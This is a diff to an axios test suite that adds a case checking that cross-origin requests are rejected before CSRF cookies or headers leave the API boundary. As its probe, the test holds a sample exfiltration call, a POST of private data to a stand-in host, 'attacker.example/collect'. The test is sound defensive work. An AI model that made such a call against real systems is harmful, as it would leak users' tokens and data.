@@ -139,4 +139,24 @@ describe('axios auth refresh handling', () => {
 
     expect(csrfHeader).toBe('profile-csrf-token');
   });
+
+  it('rejects cross-origin request URLs before cookies or CSRF headers can leave the configured API boundary', async () => {
+    document.cookie = 'XSRF-TOKEN=private-csrf-token; path=/';
+    const adapter: AxiosAdapter = vi.fn(async (config) => ({
+      config,
+      data: {},
+      headers: {},
+      status: 200,
+      statusText: 'OK',
+    }));
+
+    axiosInstance.defaults.adapter = adapter;
+
+    await expect(axiosInstance.post(
+      'https://attacker.example/collect',
+      { marker: 'private' }
+    )).rejects.toThrow(/unsafe api request target/i);
+
+    expect(adapter).not.toHaveBeenCalled();
+  });
 });
